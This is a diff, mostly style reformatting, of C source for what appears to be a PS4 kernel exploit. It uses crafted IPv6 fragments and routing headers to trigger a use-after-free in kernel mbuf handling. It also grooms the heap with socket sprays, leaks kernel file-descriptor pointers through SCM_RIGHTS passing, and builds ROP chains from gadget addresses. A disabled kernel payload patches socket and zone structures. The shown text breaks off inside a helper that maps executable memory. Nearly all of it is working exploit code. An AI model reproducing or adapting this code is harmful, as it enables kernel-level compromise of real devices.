@@ -22,10 +22,9 @@
 #include <ps4/saveall.h>
 #include <librop/extcall.h>
 
-unsigned long long __builtin_gadget_addr(const char*);
+unsigned long long __builtin_gadget_addr(const char *);
 
-void send_fragment(int fd, char* src, size_t off, size_t sz, int is_final, uint32_t ident, int proto)
-{
+void send_fragment(int fd, char *src, size_t off, size_t sz, int is_final, uint32_t ident, int proto) {
     unsigned char buf[0x2000];
     // hop-by-hop header
     buf[0] = 44;
@@ -43,29 +42,27 @@ void send_fragment(int fd, char* src, size_t off, size_t sz, int is_final, uint3
     buf[13] = ident >> 16;
     buf[14] = ident >> 8;
     buf[15] = ident;
-    for(size_t i = 0; i < sz; i++)
-        buf[16+i] = src[off+i];
+    for (size_t i = 0; i < sz; i++)
+        buf[16 + i] = src[off + i];
     struct sockaddr_in6 sin6 = {
         .sin6_family = AF_INET6,
         .sin6_addr = {0},
         .sin6_port = 0xbeef,
     };
     sin6.sin6_addr.s6_addr[15] = 1;
-    sendto(fd, buf, 16+sz, 0, (struct sockaddr*)&sin6, sizeof(sin6));
+    sendto(fd, buf, 16 + sz, 0, (struct sockaddr *)&sin6, sizeof(sin6));
 }
 
-void build_rthdr(char* buf, int sz)
-{
+void build_rthdr(char *buf, int sz) {
     buf[0] = 43;
     buf[1] = sz / 8 - 1;
     buf[2] = 0;
     buf[3] = 0;
-    for(size_t i = 4; i < sz; i++)
+    for (size_t i = 4; i < sz; i++)
         buf[i] = 0;
 }
 
-void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_final, uint32_t ident, int proto)
-{
+void send_shifted_fragment(int fd, char *src, size_t off, size_t sz, int is_final, uint32_t ident, int proto) {
     unsigned char buf[0x2000];
     // hop-by-hop header
     buf[0] = 43;
@@ -74,7 +71,7 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
     buf[3] = 4;
     buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
     // padding
-    build_rthdr(buf+8, 224);
+    build_rthdr(buf + 8, 224);
     buf[8] = 44;
     // fragment header
     buf[232] = proto;
@@ -86,15 +83,15 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
     buf[237] = ident >> 16;
     buf[238] = ident >> 8;
     buf[239] = ident;
-    for(size_t i = 0; i < sz; i++)
-        buf[240+i] = src[off+i];
+    for (size_t i = 0; i < sz; i++)
+        buf[240 + i] = src[off + i];
     struct sockaddr_in6 sin6 = {
         .sin6_family = AF_INET6,
         .sin6_addr = {0},
         .sin6_port = 0xbeef,
     };
     sin6.sin6_addr.s6_addr[15] = 1;
-    sendto(fd, buf, 240+sz, 0, (struct sockaddr*)&sin6, sizeof(sin6));
+    sendto(fd, buf, 240 + sz, 0, (struct sockaddr *)&sin6, sizeof(sin6));
 }
 
 #define RTHDR_1_SZ 0x50
@@ -107,45 +104,39 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
 #define FD_LEAK_SIZE 80
 #define CLEANUP_SIZE SPRAY_SIZE
 
-void push_mbuf(int* socks, int i)
-{
-    if(sendto(socks[i], &i, sizeof(i), 0, 0, 0) < 0)
+void push_mbuf(int *socks, int i) {
+    if (sendto(socks[i], &i, sizeof(i), 0, 0, 0) < 0)
         printf("push_mbuf failed\n");
 }
 
-void push_cluster(int* socks, int i)
-{
+void push_cluster(int *socks, int i) {
     int arr[49];
     arr[0] = i;
-    if(sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
+    if (sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
         printf("push_cluster failed\n");
 }
 
-void push_big_cluster(int* socks, int i)
-{
-    char arr[2048] = {0};
-    if(sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
+void push_big_cluster(int *socks, int i) {
+    char arr[2048] = { 0 };
+    if (sendto(socks[i], arr, sizeof(arr), 0, 0, 0) < 0)
         printf("push_cluster failed\n");
 }
 
-int pop_mbuf(int* socks, int i)
-{
+int pop_mbuf(int *socks, int i) {
     int buf[37];
     buf[0] = i;
     recvfrom(socks[i], buf, sizeof(buf), MSG_DONTWAIT, 0, 0);
     return buf[0];
 }
 
-int peek_mbuf(int* socks, int i)
-{
+int peek_mbuf(int *socks, int i) {
     int ans = 1000000;
-    recvfrom(socks[i], &ans, sizeof(ans), MSG_DONTWAIT|MSG_PEEK, 0, 0);
+    recvfrom(socks[i], &ans, sizeof(ans), MSG_DONTWAIT | MSG_PEEK, 0, 0);
     return ans;
 }
 
-int create_loopback(void)
-{
-#if 0
+int create_loopback(void) {
+    #if 0
     int sock = socket(AF_INET6, SOCK_DGRAM, 0);
     struct sockaddr_in6 sin = {
         .sin6_family = AF_INET6,
@@ -153,32 +144,30 @@ int create_loopback(void)
         .sin6_port = 0,
     };
     sin.sin6_addr.s6_addr[15] = 1;
-#else
+    #else
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     struct sockaddr_in sin = {
         .sin_family = AF_INET,
         .sin_addr = {0x100007f},
         .sin_port = 0,
     };
-#endif
+    #endif
     socklen_t sin_l = sizeof(sin);
-    bind(sock, (struct sockaddr*)&sin, sin_l);
-    getsockname(sock, (struct sockaddr*)&sin, &sin_l);
-    connect(sock, (struct sockaddr*)&sin, sin_l);
+    bind(sock, (struct sockaddr *)&sin, sin_l);
+    getsockname(sock, (struct sockaddr *)&sin, &sin_l);
+    connect(sock, (struct sockaddr *)&sin, sin_l);
     //fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) | O_NONBLOCK);
     return sock;
 }
 
-int get_port(int fd)
-{
+int get_port(int fd) {
     struct sockaddr_in6 sin;
     socklen_t l = sizeof(sin);
-    getsockname(fd, (struct sockaddr*)&sin, &l);
+    getsockname(fd, (struct sockaddr *)&sin, &l);
     return sin.sin6_port;
 }
 
-int port_to_csum(int port)
-{
+int port_to_csum(int port) {
     int base_port = 0x0de6;
     int base_csum = 0x36b1;
     int csum = base_csum - 2 * (port - base_port);
@@ -187,53 +176,49 @@ int port_to_csum(int port)
     return csum;
 }
 
-void push_jumbo(int fd)
-{
+void push_jumbo(int fd) {
     char buf[2048];
-    for(int i = 0; i < 2048; i++)
+    for (int i = 0; i < 2048; i++)
         buf[i] = 0x41;
-    for(int i = 0; i < 31; i++)
+    for (int i = 0; i < 31; i++)
         sendto(fd, buf, sizeof(buf), 0, 0, 0);
 }
 
-void* mmap_at(void* where, size_t sz)
-{
+void *mmap_at(void *where, size_t sz) {
     uintptr_t addr = (uintptr_t)where;
     uintptr_t end = addr + sz;
     addr &= ~4095ull;
-    if((uintptr_t)mmap((void*)addr, end - addr, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) != addr)
-    {
+    if ((uintptr_t)mmap((void *)addr, end - addr, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != addr) {
         printf("failed to mmap_at!\n");
         return 0;
     }
     //prefault pages
-    unsigned char* p = where;
-    for(size_t i = 0; i < sz; i++)
+    unsigned char *p = where;
+    for (size_t i = 0; i < sz; i++)
         p[i] = 0;
     return where;
 }
 
 ssize_t
-write_fd(int fd, void *ptr, size_t nbytes, int* sendfd, int cnt)
-{
+write_fd(int fd, void *ptr, size_t nbytes, int *sendfd, int cnt) {
     struct msghdr   msg;
     struct iovec    iov[1];
 
     union {
-      struct cmsghdr    cm;
-      char              control[CMSG_SPACE(MAX_FDS*sizeof(int))];
+        struct cmsghdr    cm;
+        char              control[CMSG_SPACE(MAX_FDS * sizeof(int))];
     } control_un;
-    struct cmsghdr  *cmptr;
+    struct cmsghdr *cmptr;
 
     msg.msg_control = control_un.control;
-    msg.msg_controllen = CMSG_SPACE(cnt*sizeof(int));
+    msg.msg_controllen = CMSG_SPACE(cnt * sizeof(int));
 
     cmptr = CMSG_FIRSTHDR(&msg);
-    cmptr->cmsg_len = CMSG_LEN(cnt*sizeof(int));
+    cmptr->cmsg_len = CMSG_LEN(cnt * sizeof(int));
     cmptr->cmsg_level = SOL_SOCKET;
     cmptr->cmsg_type = SCM_RIGHTS;
-    for(int i = 0; i < cnt; i++)
-        ((int *) CMSG_DATA(cmptr))[i] = sendfd[i];
+    for (int i = 0; i < cnt; i++)
+        ((int *)CMSG_DATA(cmptr))[i] = sendfd[i];
 
     msg.msg_name = NULL;
     msg.msg_namelen = 0;
@@ -247,21 +232,20 @@ write_fd(int fd, void *ptr, size_t nbytes, int* sendfd, int cnt)
 }
 
 ssize_t
-read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt)
-{
+read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt) {
     struct msghdr   msg;
     struct iovec    iov[1];
     ssize_t         n;
     int             newfd;
 
     union {
-      struct cmsghdr    cm;
-      char              control[CMSG_SPACE(MAX_FDS*sizeof(int))];
+        struct cmsghdr    cm;
+        char              control[CMSG_SPACE(MAX_FDS * sizeof(int))];
     } control_un;
-    struct cmsghdr  *cmptr;
+    struct cmsghdr *cmptr;
 
     msg.msg_control = control_un.control;
-    msg.msg_controllen = CMSG_SPACE(cnt*sizeof(int));
+    msg.msg_controllen = CMSG_SPACE(cnt * sizeof(int));
 
     msg.msg_name = NULL;
     msg.msg_namelen = 0;
@@ -271,17 +255,17 @@ read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt)
     msg.msg_iov = iov;
     msg.msg_iovlen = 1;
 
-    if ( (n = recvmsg(fd, &msg, 0)) <= 0)
+    if ((n = recvmsg(fd, &msg, 0)) <= 0)
         return(n);
 
-    if ( (cmptr = CMSG_FIRSTHDR(&msg)) != NULL &&
-        cmptr->cmsg_len == CMSG_LEN(cnt*sizeof(int))) {
-        for(int i = 0; i < cnt; i++)
-            recvfd[i] = ((int *) CMSG_DATA(cmptr))[i];
+    if ((cmptr = CMSG_FIRSTHDR(&msg)) != NULL &&
+        cmptr->cmsg_len == CMSG_LEN(cnt * sizeof(int))) {
+        for (int i = 0; i < cnt; i++)
+            recvfd[i] = ((int *)CMSG_DATA(cmptr))[i];
     } else {
-        if(cmptr)
-            for(int i = 0; i < 64; i++)
-                printf("%08x\n", ((int*)CMSG_DATA(cmptr))[i]);
+        if (cmptr)
+            for (int i = 0; i < 64; i++)
+                printf("%08x\n", ((int *)CMSG_DATA(cmptr))[i]);
         else
             printf("no cmptr\n");
         n = -1;       /* descriptor was not passed */
@@ -298,14 +282,13 @@ read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt)
   179 already exploited
 */
 
-int* kp_bad_fds;
-int* kp_bad_fds_end;
+int *kp_bad_fds;
+int *kp_bad_fds_end;
 
-int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds)
-{
+int leak_fds(int *fd_to_leak, uintptr_t *out, int nfds) {
     printf("starting kex...\n");
     printf("fds:");
-    for(int i = 0; i < nfds; i++)
+    for (int i = 0; i < nfds; i++)
         printf(" %d", fd_to_leak[i]);
     printf("\n");
     cpuset_t xxx;
@@ -314,94 +297,86 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds)
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
     int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
     int socks[SPRAY_SIZE];
-    for(int i = 0; i < SPRAY_SIZE; i++)
+    for (int i = 0; i < SPRAY_SIZE; i++)
         socks[i] = create_loopback();
     int un[2 * NUM_UNIX];
-    for(int i = 0; i < NUM_UNIX; i++)
-        socketpair(AF_UNIX, SOCK_STREAM, 0, un+2*i);
+    for (int i = 0; i < NUM_UNIX; i++)
+        socketpair(AF_UNIX, SOCK_STREAM, 0, un + 2 * i);
     char buf[RTHDR_1_SZ + RTHDR_2_SZ];
     char buf_final[4096];
-    for(int i = 0; i < 4096; i++)
+    for (int i = 0; i < 4096; i++)
         buf_final[i] = 255;
     char buf_unix[4097];
-    for(int i = 0; i < 4097; i++)
+    for (int i = 0; i < 4097; i++)
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
     //nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    for(int i = 0; i < SPRAY_SIZE; i++)
-    {
+    nanosleep((void *)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    for (int i = 0; i < SPRAY_SIZE; i++) {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
+        nanosleep((void *)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
     }
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
-    for(int i = 0; i < SPRAY_SIZE; i++)
-    {
+    for (int i = 0; i < SPRAY_SIZE; i++) {
         int j = peek_mbuf(socks, i);
-        if(i != j)
+        if (i != j)
             printf("%d -> %d\n", bad1 = i, bad2 = j);
     }
-    if(bad1 < 0)
-    {
+    if (bad1 < 0) {
         printf("leak_fds: no collision\n");
         return 2;
     }
-    for(int i = 0; i < NUM_UNIX; i++)
-        push_big_cluster(un, 2*i);
+    for (int i = 0; i < NUM_UNIX; i++)
+        push_big_cluster(un, 2 * i);
     pop_mbuf(socks, bad1);
-    for(int i = 0; i < NUM_UNIX; i++)
-        push_cluster(un, 2*i);
-    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
-    int bad3 = 1+*(int*)buf_final;
+    for (int i = 0; i < NUM_UNIX; i++)
+        push_cluster(un, 2 * i);
+    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT | MSG_PEEK, 0, 0);
+    int bad3 = 1 + *(int *)buf_final;
     pop_mbuf(socks, bad2);
     sendto(un[(bad3 == 1) ? 1 : 0], "X", 1, 0, 0, 0);
-    for(int i = 0; i < NUM_UNIX; i++)
-        if(i != (bad3 - 1) / 2)
-            write_fd(un[2*i], buf_unix, sizeof(buf_unix), fd_to_leak, nfds);
-    for(int i = 0; i < NUM_UNIX; i++)
-    {
-        recvfrom(un[2*i+1], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
-        if(*(int*)(buf_final+2048) != 2*i)
-        {
-            if(bad3 != 2*i+1)
-            {
+    for (int i = 0; i < NUM_UNIX; i++)
+        if (i != (bad3 - 1) / 2)
+            write_fd(un[2 * i], buf_unix, sizeof(buf_unix), fd_to_leak, nfds);
+    for (int i = 0; i < NUM_UNIX; i++) {
+        recvfrom(un[2 * i + 1], buf_final, sizeof(buf_final), MSG_DONTWAIT | MSG_PEEK, 0, 0);
+        if (*(int *)(buf_final + 2048) != 2 * i) {
+            if (bad3 != 2 * i + 1) {
                 printf("leak_fds: wrong socket corrupted\n");
                 return 2;
             }
             printf("fucked up %d\n", i);
-            uintptr_t* leak = (uintptr_t*)(buf_final+2048);
-            if(leak[0] != __builtin_gadget_addr("dq 0xffff00000000") + (nfds+2)*8 || (unsigned int)leak[1] != 1)
-            {
+            uintptr_t *leak = (uintptr_t *)(buf_final + 2048);
+            if (leak[0] != __builtin_gadget_addr("dq 0xffff00000000") + (nfds + 2) * 8 || (unsigned int)leak[1] != 1) {
                 printf("leak_fds: unexpected leak content: 0x%llx 0x%llx\n", leak[0], leak[1]);
                 return 2;
             }
-            for(int i = 0; i < nfds; i++)
-                out[i] = leak[i+2];
+            for (int i = 0; i < nfds; i++)
+                out[i] = leak[i + 2];
         }
     }
-    for(int i = 0; i < 2*NUM_UNIX; i++)
-        if(i != bad3)
+    for (int i = 0; i < 2 * NUM_UNIX; i++)
+        if (i != bad3)
             close(un[i]);
-    for(int i = 0; i < SPRAY_SIZE; i++)
-        if(i != bad1 && i != bad2)
+    for (int i = 0; i < SPRAY_SIZE; i++)
+        if (i != bad1 && i != bad2)
             close(socks[i]);
     close(sock);
     *kp_bad_fds_end++ = socks[bad1];
     *kp_bad_fds_end++ = socks[bad2];
-    *kp_bad_fds_end++ = un[bad3-1];
+    *kp_bad_fds_end++ = un[bad3 - 1];
     *kp_bad_fds_end++ = un[bad3];
     return 0;
 }
 
-void fix_fds(int* kp_bad_fds, int nfds);
+void fix_fds(int *kp_bad_fds, int nfds);
 
-int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
-{
+int trigger(int trg_fd, uintptr_t trg_addr, int *sel_cur) {
     printf("starting kex...\n");
     cpuset_t xxx;
     CPU_ZERO(&xxx);
@@ -409,53 +384,48 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(xxx), &xxx);
     int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
     int socks[SPRAY_SIZE];
-    for(int i = 0; i < SPRAY_SIZE; i++)
+    for (int i = 0; i < SPRAY_SIZE; i++)
         socks[i] = create_loopback();
-    int un[2*NUM_UNIX];
+    int un[2 * NUM_UNIX];
     int sp_or = 0;
-    for(int i = 0; i < NUM_UNIX; i++)
-        socketpair(AF_UNIX, SOCK_STREAM, 0, un+2*i);
+    for (int i = 0; i < NUM_UNIX; i++)
+        socketpair(AF_UNIX, SOCK_STREAM, 0, un + 2 * i);
     char buf[RTHDR_1_SZ + RTHDR_2_SZ];
     char buf_final[4096];
-    for(int i = 0; i < 4096; i++)
+    for (int i = 0; i < 4096; i++)
         buf_final[i] = 255;
     char buf_unix[4097];
-    for(int i = 0; i < 4097; i++)
+    for (int i = 0; i < 4097; i++)
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
     //nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    for(int i = 0; i < SPRAY_SIZE; i++)
-    {
+    nanosleep((void *)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    for (int i = 0; i < SPRAY_SIZE; i++) {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
+        nanosleep((void *)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
     }
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
-    for(int i = 0; i < SPRAY_SIZE; i++)
-    {
+    for (int i = 0; i < SPRAY_SIZE; i++) {
         int j = peek_mbuf(socks, i);
-        if(i != j)
+        if (i != j)
             printf("%d -> %d\n", bad1 = i, bad2 = j);
     }
-    if(bad1 < 0)
-    {
+    if (bad1 < 0) {
         printf("trigger: no collision\n");
         return 2;
-    }
-    else if(bad2 == 48)
-    {
+    } else if (bad2 == 48) {
         printf("bogus48, restarting...\n");
         *kp_bad_fds_end++ = socks[bad1];
         close(sock);
-        for(int i = 0; i < SPRAY_SIZE; i++)
-            if(i != bad1)
+        for (int i = 0; i < SPRAY_SIZE; i++)
+            if (i != bad1)
                 close(socks[i]);
-        for(int i = 0; i < 2*NUM_UNIX; i++)
+        for (int i = 0; i < 2 * NUM_UNIX; i++)
             close(un[i]);
         return 48;
     }
@@ -468,15 +438,14 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
     buf[2] = 1;
     buf[3] = 4;
     buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
-    for(int i = 0; i < NUM_PACKETS; i++)
-        send_shifted_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xfee10000+i, 60);
+    for (int i = 0; i < NUM_PACKETS; i++)
+        send_shifted_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xfee10000 + i, 60);
     //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     //print_mbuf_addr(socks[bad2]);
-    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
-    int uaf_idx = __builtin_bswap32(*(unsigned int*)(buf_final+276));
-    if((uaf_idx & 0xffff0000) != 0xfee10000)
-    {
+    recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT | MSG_PEEK, 0, 0);
+    int uaf_idx = __builtin_bswap32(*(unsigned int *)(buf_final + 276));
+    if ((uaf_idx & 0xffff0000) != 0xfee10000) {
         printf("uaf not exploited, wtf??\n");
         return 2;
     }
@@ -484,67 +453,61 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
     //print_mbuf_addr(socks[bad2]);
     pop_mbuf(socks, bad2);
     int fd_to_pass[32];
-    for(int i = 0; i < 32; i++)
+    for (int i = 0; i < 32; i++)
         fd_to_pass[i] = trg_fd;
     char x = 'X';
-    for(int i = 0; i < NUM_UNIX; i++)
-        write_fd(un[2*i], buf_unix, sizeof(buf_unix), fd_to_pass, 32);
-    for(int i = 0; i < NUM_PACKETS; i++)
-        if(i != uaf_idx)
-            send_fragment(sock, buf_final, FIRST_FRAGMENT_SZ, 1, 1, 0xfee10000+i, 60);
-    if(1)
-    {
+    for (int i = 0; i < NUM_UNIX; i++)
+        write_fd(un[2 * i], buf_unix, sizeof(buf_unix), fd_to_pass, 32);
+    for (int i = 0; i < NUM_PACKETS; i++)
+        if (i != uaf_idx)
+            send_fragment(sock, buf_final, FIRST_FRAGMENT_SZ, 1, 1, 0xfee10000 + i, 60);
+    if (1) {
         int i = uaf_idx;
         int off = FIRST_FRAGMENT_SZ;
-        while(off + sizeof(buf_final) < 65536)
-        {
-            send_fragment(sock, buf_final - off, off, sizeof(buf_final), 0, 0xfee10000+i, 60);
+        while (off + sizeof(buf_final) < 65536) {
+            send_fragment(sock, buf_final - off, off, sizeof(buf_final), 0, 0xfee10000 + i, 60);
             off += sizeof(buf_final);
         }
-        send_fragment(sock, buf_final - off, off, 3807, 1, 0xfee10000+i, 60);
+        send_fragment(sock, buf_final - off, off, 3807, 1, 0xfee10000 + i, 60);
     }
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void *)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     int ss[32];
-    struct pollfd pfd = {.events = POLLIN, .revents = 0};
+    struct pollfd pfd = { .events = POLLIN, .revents = 0 };
     *kp_bad_fds_end++ = socks[bad1];
     socks[bad1] = create_loopback();
     *kp_bad_fds_end++ = socks[bad2];
     socks[bad2] = create_loopback();
     int bad_un = -1;
-    for(int i = 0; i < NUM_UNIX; i++)
-    {
+    for (int i = 0; i < NUM_UNIX; i++) {
         //bad_fds[2] = un[2*i+1];
-        if(read_fd(un[2*i+1], &x, 1, fd_to_pass, 32) < 0)
-        {
+        if (read_fd(un[2 * i + 1], &x, 1, fd_to_pass, 32) < 0) {
             printf("read_fd failed, wtf??\n");
             continue;
         }
-        for(int j = 0; j < 32; j++)
-        {
+        for (int j = 0; j < 32; j++) {
             *sel_cur = pfd.fd = fd_to_pass[j];
             poll(&pfd, 1, 0); //kpayload
             close(fd_to_pass[j]);
-            if(*sel_cur == -1)
-            {
-                for(int i = 0; i < CLEANUP_SIZE; i++)
+            if (*sel_cur == -1) {
+                for (int i = 0; i < CLEANUP_SIZE; i++)
                     push_cluster(socks, i);
                 fix_fds(socks, CLEANUP_SIZE);
                 bad_un = i;
-                *kp_bad_fds_end++ = un[2*i];
-                *kp_bad_fds_end++ = un[2*i+1];
+                *kp_bad_fds_end++ = un[2 * i];
+                *kp_bad_fds_end++ = un[2 * i + 1];
             }
         }
     }
     //this code crashes. but if we don't close them explicitly the process will terminate just fine
-#if 0
-    for(int i = 0; i < 2*NUM_UNIX; i++)
-        if(i != 2 * bad_un && i != 2 * bad_un + 1)
+    #if 0
+    for (int i = 0; i < 2 * NUM_UNIX; i++)
+        if (i != 2 * bad_un && i != 2 * bad_un + 1)
             close(un[i]);
-    for(int i = 0; i < SPRAY_SIZE; i++)
-        if(i != bad1 && i != bad2)
+    for (int i = 0; i < SPRAY_SIZE; i++)
+        if (i != bad1 && i != bad2)
             close(socks[i]);
     close(sock);
-#endif
+    #endif
     return 0;
 }
 
@@ -554,33 +517,30 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
 38
 */
 #if 0
-void* kernel_payload(void* o, int****** td, unsigned long long kernel_base, uintptr_t decref_fp, int* kp_bad_fds)
-{
-    int*** fd = td[1][9][0];
-    for(int i = 0; i < 6; i++)
-    {
-        int* sock = fd[kp_bad_fds[i]][0];
-        for(int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
+void *kernel_payload(void *o, int ******td, unsigned long long kernel_base, uintptr_t decref_fp, int *kp_bad_fds) {
+    int ***fd = td[1][9][0];
+    for (int i = 0; i < 6; i++) {
+        int *sock = fd[kp_bad_fds[i]][0];
+        for (int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
         {
-            sock[base+9] = 0; // sb_cc
-            sock[base+11] = 0; // sb_mbcnf
+            sock[base + 9] = 0; // sb_cc
+            sock[base + 11] = 0; // sb_mbcnf
             sock[base] = 0; // sb_mb low
-            sock[base+1] = 0; // sb_mb high
+            sock[base + 1] = 0; // sb_mb high
         }
         //fd[kp_bad_fds[i]] = 0;
     }
-    fd[kp_bad_fds[6]] = (void*)decref_fp; //0;
-    void** zone_pack = *(void**)(kernel_base + 0x1b45a28);
-    for(int i = 0; i < 8; i++)
-        zone_pack[32+16*i] = zone_pack[33+16*i] = 0; //detach buckets
+    fd[kp_bad_fds[6]] = (void *)decref_fp; //0;
+    void **zone_pack = *(void **)(kernel_base + 0x1b45a28);
+    for (int i = 0; i < 8; i++)
+        zone_pack[32 + 16 * i] = zone_pack[33 + 16 * i] = 0; //detach buckets
     return 0x12345678;
 }
 #endif
 
-int randomized_path(unsigned long long, char*, size_t*);
+int randomized_path(unsigned long long, char *, size_t *);
 
-int my_dup(int fd)
-{
+int my_dup(int fd) {
     int un[2];
     socketpair(AF_UNIX, SOCK_STREAM, 0, un);
     char x = 'X';
@@ -591,15 +551,14 @@ int my_dup(int fd)
     return fd;
 }
 
-void sidt(unsigned short* size, unsigned long long* base)
-{
+void sidt(unsigned short *size, unsigned long long *base) {
     unsigned char data[10];
     unsigned long long ropchain[12] = {
         __builtin_gadget_addr("mov rax, [rdi]"),
         __builtin_gadget_addr("pop rsi"),
-        ropchain+11,
+        ropchain + 11,
         __builtin_gadget_addr("mov [rsi], rax ; mov al, 1"),
-	__builtin_gadget_addr("pop rax"),
+    __builtin_gadget_addr("pop rax"),
         data + 0x77,
         __builtin_gadget_addr("sidt [rax - 0x77]"),
         __builtin_gadget_addr("pop rsi"),
@@ -609,12 +568,11 @@ void sidt(unsigned short* size, unsigned long long* base)
         0
     };
     ((void(*)(void))ropchain)();
-    *size = *(unsigned short*)data;
-    *base = *(unsigned long long*)(data + 2);
+    *size = *(unsigned short *)data;
+    *base = *(unsigned long long *)(data + 2);
 }
 
-void print_sidt(void)
-{
+void print_sidt(void) {
     unsigned short len;
     unsigned long long base;
     sidt(&len, &base);
@@ -644,69 +602,60 @@ extern unsigned long long kp_kernel_base;
 extern unsigned long long kernel_fixup_ret;
 extern unsigned long long kp_decref_fp;
 
-int wrap_trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
-{
+int wrap_trigger(int trg_fd, uintptr_t trg_addr, int *sel_cur) {
     int ans = 48;
-    while(ans == 48)
+    while (ans == 48)
         ans = trigger(trg_fd, trg_addr, sel_cur);
     return ans;
 }
 
-char* kexec_helper_rwx = 0;
+char *kexec_helper_rwx = 0;
 extern char kexec_helper_bin[];
 extern char kexec_helper_end[];
 
-void kexec_helper(void* src, void* dst, void* gs0)
-{
-    if(!kexec_helper_rwx)
-    {
-        kexec_helper_rwx = mmap(0, kexec_helper_end - kexec_helper_bin, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
